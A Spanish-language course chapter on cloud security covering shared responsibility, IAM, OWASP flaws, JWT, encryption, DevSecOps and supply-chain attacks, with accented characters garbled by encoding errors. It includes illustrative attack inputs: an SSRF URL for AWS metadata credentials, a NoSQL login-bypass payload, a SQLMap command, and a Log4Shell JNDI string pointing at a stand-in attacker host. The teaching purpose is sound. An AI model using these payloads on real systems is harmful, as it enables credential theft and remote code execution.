# 5.6 Seguridad e Interoperabilidad en la Nube

La seguridad en la nube (Cloud Security) es la disciplina de proteger datos, aplicaciones e infraestructura.
**Mito:** "La nube es insegura".
**Realidad:** La nube es m√°s segura que tu datacenter, pero t√∫ eres el eslab√≥n d√©bil.

---

## Modelo de Responsabilidad Compartida

AWS protege la nube. T√∫ proteges lo que est√° EN la nube.

| Qui√©n protege qu√©... | On-Premises | IaaS (EC2) | PaaS (Lambda) | SaaS (Gmail) |
| :--- | :--- | :--- | :--- | :--- |
| Datacenter F√≠sico | T√∫ | AWS | AWS | AWS |
| Sistema Operativo | T√∫ | **T√∫** | AWS | AWS |
| Datos y Accesos | T√∫ | **T√∫** | **T√∫** | **T√∫** |

**Regla de Oro:** En la nube, la seguridad de los DATOS siempre es tuya. AWS no sabe si tu contrase√±a es "123456".

---

## La Tr√≠ada CIA (Confidencialidad, Integridad, Disponibilidad)

1.  **Confidencialidad:** "Solo t√∫ ves tus datos".
    *   *Herramienta:* Encriptaci√≥n (KMS), ACLs.
2.  **Integridad:** "Tus datos no han sido alterados".
    *   *Herramienta:* Checksums, logs inmutables (CloudTrail), firmas digitales.
3.  **Disponibilidad:** "Tus datos est√°n accesibles cuando los necesitas".
    *   *Herramienta:* Multi-AZ, Load Balancers, Protecci√≥n DDoS.

---

---

## IAM: Identity and Access Management (El Portero)

IAM decide qui√©n puede entrar y qu√© puede hacer.

### Conceptos B√°sicos IAM
1.  **User:** Una persona o servicio con credenciales permanentes.
2.  **Role:** Un "sombrero" temporal con permisos espec√≠ficos. (Ej. "Sombrero de leer S3").
3.  **Policy:** El documento JSON que dice qu√© puedes hacer.

**Principio de Menor Privilegio (Least Privilege):**
Dale al usuario SOLO lo que necesita para trabajar. Ni un permiso m√°s.
*   ¬øNecesita leer S3? Dale `UseS3Read`. No le des `AdministratorAccess`.

---

## OWASP Top 10 (Edici√≥n Nube)

Los hackers no rompen la encriptaci√≥n AES-256. Entran porque dejaste la puerta abierta.

### Broken Object Level Authorization (BOLA)
*   **Ataque:** Cambio el ID en la URL: `/facturas/100` -> `/facturas/101`.
*   **Fallo:** El c√≥digo no verific√≥ si el usuario actual es due√±o de la factura 101.
*   **Soluci√≥n:** Validar propiedad en cada request.

### Security Misconfiguration (S3 Leaks)
*   **Ataque:** Escanear internet buscando buckets S3 p√∫blicos.
*   **Fallo:** Dejaste un bucket con fotos de pasaportes abierto a "All Users".
*   **Soluci√≥n:** Bloquear acceso p√∫blico por defecto en la cuenta.

### Server-Side Request Forgery (SSRF)
*   **Ataque:** Haces que el servidor haga una llamada HTTP a s√≠ mismo.
*   **Objetivo:** Leer la metadata de AWS (`http://169.254.169.254/latest/meta-data/iam/security-credentials/`).
*   **Resultado:** El hacker roba las keys temporales del Rol del servidor.

### Inyecci√≥n de NoSQL
*   **C√≥digo vulnerable:** `db.users.find({ user: req.body.user, pass: req.body.pass })`.
*   **Ataque:** `{"user": "admin", "pass": {"$ne": null}}`. (Pass no es nulo).
*   **Resultado:** Login exitoso sin password.

---

---

## Autenticaci√≥n Moderna (Standards)

No crees tu propio sistema de login. Te lo van a hackear. Usa est√°ndares.

### OAuth 2.0 (Autorizaci√≥n)
*   **¬øQu√© es?** Un protocolo para delegar acceso.
*   **Ejemplo:** "Dar permiso a Spotifly para leer mis Playlists de Google". Spotify **NO** ve mi password de Google.
*   **Flow:** El usuario se loguea en Google, Google le da un `Access Token` a Spotify.

### OIDC: OpenID Connect (Autenticaci√≥n)
*   OAuth 2.0 es para *permisos*, no para saber *qui√©n eres*.
*   **OIDC** es una capa sobre OAuth 2.0 que a√±ade un `ID Token` (JWT).
*   **Resultado:** "Log in with Google". Tu app recibe:
    *   `Access Token`: Para llamar a la API de Gmail.
    *   `ID Token`: Dice "Soy Jes√∫s Olvera, mi email es..."

### SAML (El Abuelo Enterprise)
*   Basado en XML.
*   Usado por bancos y gobiernos para SSO (Single Sign-On).
*   **Complejo:** XML Signature es dif√≠cil de implementar bien. OIDC es el futuro.

---

## Encriptaci√≥n (Protegiendo los datos)

### En Tr√°nsito (TLS/SSL)
*   Tus datos viajan por cables submarinos p√∫blicos.
*   **TLS 1.2+:** Asegura que nadie pueda leer el tr√°fico HTTP.
*   **Consejo:** Usa **Certbot (Let's Encrypt)** para tener certificados SSL gratis y autom√°ticos.

### En Reposo (KMS)
*   Si alguien se roba el disco duro f√≠sico de Amazon, ¬øpuede leer tus datos?
*   **AWS KMS (Key Management Service):** Amazon tiene la "Llave Maestra" (CMK) en hardware especial (HSM).
*   T√∫ encriptas tus datos antes de guardarlos en DB. AWS nunca ve tus datos en plano, solo la llave.

---

## Interoperabilidad (Formatos de Intercambio)

Para que AWS hable con Azure, necesitan un lenguaje com√∫n.

### JSON-LD (Linked Data)
*   A√±ade "sem√°ntica" al JSON.
*   `"@context": "http://schema.org"` define qu√© significan los campos.

### gRPC & Protobuf
*   Permite que un microservicio en Golang (AWS) llame a uno en C# (Azure) de forma binaria y tipada.

---

---

## Anatom√≠a de un JWT (JSON Web Token)

El est√°ndar de facto para Auth en microservicios.
Se ve as√≠: `aaaaa.bbbbb.ccccc`

### Header (Encabezado)
Dice qu√© algoritmo se us√≥.
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

### Payload (Carga √ötil)
Los datos del usuario (Claims).
```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "admin": true,
  "iat": 1516239022
}
```
*   **Advertencia:** El Payload es **Base64Url encoded**, NO encriptado. Cualquiera puede leerlo en `jwt.io`. NO guardes passwords aqu√≠.

### Signature (Firma)
La parte m√°gica.
```
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret
)
```
*   Si el hacker cambia `"admin": false` a `"admin": true`, la firma ya no coincide y el servidor rechaza el token.

---

## Pentesting B√°sico (Hackea tu propia App)

No esperes a que lo hagan los rusos.

### Burp Suite (El Interceptor)
*   **Uso:** Se pone en medio de tu navegador y el servidor.
*   **Ataque:** Captura un request, edita los par√°metros (`price=10` -> `price=0.01`) y reenv√≠a.
*   **Defensa:** Validar siempre en el Backend. Nunca conf√≠es en el Frontend.

### SQLMap (La Inyecci√≥n Autom√°tica)
*   **Uso:** Le das una URL: `python sqlmap.py -u "http://miweb.com?id=1"`.
*   **Ataque:** Prueba 10,000 tipos de inyecci√≥n SQL hasta que saca la base de datos entera.
*   **Defensa:** Usar ORM (Sequelize/TypeORM) o Prepared Statements.

---

## Compliance (Leyes y Normas)

Si tocas tarjetas de cr√©dito o datos de salud, lee esto.

### GDPR (Europa)
*   **Derecho al Olvido:** Si un usuario pide borrar sus datos, tienes que borrarlos DE VERDAD (incluso de los backups).
*   **Multas:** 4% de la facturaci√≥n global de la empresa.

### PCI-DSS (Tarjetas de Cr√©dito)
*   Nunca guardes el n√∫mero de tarjeta (PAN) en tu base de datos.
*   Usa Stripe Elements o PayPal para que ellos manejen la tarjeta y t√∫ solo recibas un Token.

---

---

## DevSecOps (Integrando Seguridad en el Pipeline)

La seguridad no es un equipo que revisa al final ("The Gatekeeper"). Es parte del proceso CI/CD.

### SCA (Software Composition Analysis)
*   **Problema:** Tu c√≥digo es seguro, pero usas una librer√≠a `axios` vieja con vulnerabilidades.
*   **Soluci√≥n:** `npm audit`.
*   **Herramienta:** Snyk o GitHub Dependabot.

### SAST (Static Application Security Testing)
*   **Qu√© hace:** Lee tu c√≥digo fuente buscando patrones inseguros (como passwords en texto plano).
*   **Herramienta:** SonarQube.
*   **Cu√°ndo:** En cada commit.

### DAST (Dynamic Application Security Testing)
*   **Qu√© hace:** Ataca tu aplicaci√≥n corriendo en Staging como si fuera un hacker.
*   **Herramienta:** OWASP ZAP.
*   **Cu√°ndo:** Antes del deploy a producci√≥n.

---

## Arquitectura Zero Trust (El fin del VPN)

**Modelo Viejo (Castillo y Foso):**
*   "Si est√°s en la VPN de la oficina, eres confiable".
*   Si un hacker entra a la VPN, tiene acceso a todo.

**Modelo Zero Trust (Google BeyondCorp):**
*   "Nunca conf√≠es, siempre verifica".
*   Cada petici√≥n HTTP debe estar autenticada, encriptada y autorizada, venga de donde venga.
*   **Device Trust:** No solo verifico tu usuario, verifico que tu laptop tenga el antivirus actualizado antes de dejarte entrar a la DB.

---

## Gesti√≥n de Secretos (Ejemplo Pr√°ctico)

C√≥mo leer un secreto desde AWS Secrets Manager en Node.js (Sin `.env` files).

```javascript
const { SecretsManagerClient, GetSecretValueCommand } = require("@aws-sdk/client-secrets-manager");

const client = new SecretsManagerClient({ region: "us-east-1" });

async function getDatabasePassword() {
  try {
    const response = await client.send(
      new GetSecretValueCommand({ SecretId: "prod/db/password" })
    );
    const secret = JSON.parse(response.SecretString);
    return secret.password;
  } catch (error) {
    console.error("No pude leer el secreto", error);
    process.exit(1);
  }
}

// Uso: Conectar a la DB usando el password rotado
getDatabasePassword().then(password => {
  db.connect(user, password);
});
```
*   **Ventaja:** Si el DBA rota la contrase√±a en AWS, tu c√≥digo la lee fresca en el siguiente reinicio. Sin redeploy.

---

---

## Cabeceras de Seguridad (La Primera Defensa)

Tu servidor Express/Nginx debe enviar esto:

### Content Security Policy (CSP)
Evita el XSS dici√©ndole al navegador qu√© scripts puede ejecutar.
`Content-Security-Policy: default-src 'self'; script-src https://apis.google.com`
*   Si un hacker inyecta `<script>bad()</script>`, el navegador lo bloquea porque no est√° en la lista blanca.

### Strict-Transport-Security (HSTS)
`Strict-Transport-Security: max-age=31536000; includeSubDomains`
*   Le dice al navegador: "Durante el pr√≥ximo a√±o, NUNCA aceptes una conexi√≥n HTTP insegura a mi sitio. Solo HTTPS".

### X-Frame-Options
`X-Frame-Options: DENY`
*   Evita el **Clickjacking**: Que alguien meta tu sitio en un `<iframe>` invisible y robe los clics del usuario.

---

## CORS Deep Dive (Cross-Origin Resource Sharing)

### La pesadilla del Preflight
Si haces un `POST` con JSON o un Header custom (`Authorization`), el navegador primero env√≠a un `OPTIONS`.
*   **Request:** `OPTIONS /api/data`.
*   **Response:** `204 No Content`. `Access-Control-Allow-Methods: POST`.
Solo si el Preflight pasa, el navegador env√≠a el `POST` real.

### El peligro del Wildcard
`Access-Control-Allow-Origin: *`
*   Est√° bien para APIs p√∫blicas.
*   **Mortal** para APIs con credenciales (Cookies). Si usas `*`, el navegador bloquear√° las Cookies por seguridad. Debes reflejar el dominio exacto: `https://mi-frontend.com`.

---

## Hardening Docker (Seguridad en Contenedores)

Por defecto, Docker es inseguro.

### CORRE COMO NO-ROOT
Si alguien hackea tu Container corriendo como root... puede escapar al Host.

**Dockerfile Seguro:**
```dockerfile
FROM node:18-alpine
WORKDIR /app
COPY . .
# Crear usuario 'node' (ya viene en alpine)
USER node
CMD ["node", "index.js"]
```

### Distroless Images
Usa im√°genes base que NO tengan shell (`sh` ni `bash`).
`FROM gcr.io/distroless/nodejs:18`
*   Si el hacker entra... no tiene terminal para ejecutar comandos. Jaque mate.

---

## Certificaciones de Seguridad (El Nivel Experto)

1.  **AWS Certified Security - Specialty:** Experto en KMS, IAM, Shield y WAF de Amazon.
2.  **CISSP:** La certificaci√≥n de seguridad m√°s respetada (Gerencial).
3.  **OSCP (Offensive Security Certified Professional):** 24 horas hackeando m√°quinas reales. Respeto absoluto.

---

---

## Gu√≠a de Algoritmos de Encriptaci√≥n (No inventes los tuyos)

### Sim√©trica (Misma llave abre y cierra)
*   **AES-256-GCM:** El est√°ndar de oro. √ösalo para guardar datos en DB. R√°pido y seguro.
*   **ChaCha20:** Alternativa muy r√°pida para m√≥viles sin hardware de encriptaci√≥n.

### Asim√©trica (Llave p√∫blica y privada)
*   **RSA-4096:** El cl√°sico. Lento pero robusto. Usado en certificados SSL viejos.
*   **ECC (Elliptic Curve):** El moderno. Llaves mucho m√°s cortas para la misma seguridad. Usado en Bitcoin y SSL moderno.

### Hashing (Solo ida)
*   **SHA-256:** Para verificar integridad (Checksums). R√°pido.
*   **Argon2 / bcrypt:** Para **passwords**. Son lentos a prop√≥sito para evitar ataques de fuerza bruta.
*   **MD5 / SHA-1:** **ROTOS**. Nunca los uses.

---

## Checklist de C√≥digo Seguro (Node.js)

1.  [ ] **HTTPS:** Obligatorio. Usa Certbot / Let's Encrypt.
2.  [ ] **Input Validation:** Valida todo con Zod/Joi. No conf√≠es en el Frontend.
3.  [ ] **Rate Limiting:** Evita ataques de fuerza bruta.
4.  [ ] **Helmet:** Headers de seguridad HTTP.
5.  [ ] **No Secrets in Code:** Usa variables de entorno (`.env`), nunca hardcodees passwords.
6.  [ ] **Errores Gen√©ricos:** Nunca devuelvas el Stack Trace al usuario. "Ocurri√≥ un error", punto.

---

## Manejo de PII (Datos Personales)

Si te roban la base de datos, que no sirva de nada.

### Tokenizaci√≥n
*   En lugar de guardar "Juan P√©rez, Tarjeta 4444", guardas "Token: Xy9z".
*   Un servidor separado y ultra-seguro (Vault) tiene el mapa `Xy9z = Juan P√©rez`.
*   Si hackean tu DB principal, solo ven tokens in√∫tiles.

### Enmascaramiento (Masking)
*   En los logs y paneles de admin, muestra `J*** P****`.
*   Solo el Super-Admin puede ver el dato real.

---

---

## Supply Chain Attacks (Cuando el enemigo est√° dentro)

Ya no atacan tu firewall. Atacan las librer√≠as que usas.

### El Caso SolarWinds
*   Hackers rusos infectaron el sistema de *build* de SolarWinds.
*   SolarWinds envi√≥ una actualizaci√≥n "firmada y segura" a 18,000 clientes (incluyendo la NASA y el Pent√°gono).
*   La actualizaci√≥n tra√≠a un backdoor.
*   **Lecci√≥n:** Confiar en el proveedor no es suficiente.

### Log4Shell (Log4j)
*   Una librer√≠a de logs de Java (usada por todo el mundo, desde Minecraft hasta Apple) ten√≠a un fallo cr√≠tico.
*   Permit√≠a ejecuci√≥n remota de c√≥digo solo enviando un texto al chat: `${jndi:ldap://hacker.com/malware}`.
*   **Defensa:** Tener un **Inventario de Software (SBOM)** para saber D√ìNDE usas log4j y parchearlo en horas, no semanas.

---

<div align="center">

[‚¨ÖÔ∏è Anterior: 5.5 Plataformas](5.5.md) &nbsp;&nbsp;|&nbsp;&nbsp; [Volver al Inicio üè†](../../README.md)

</div>
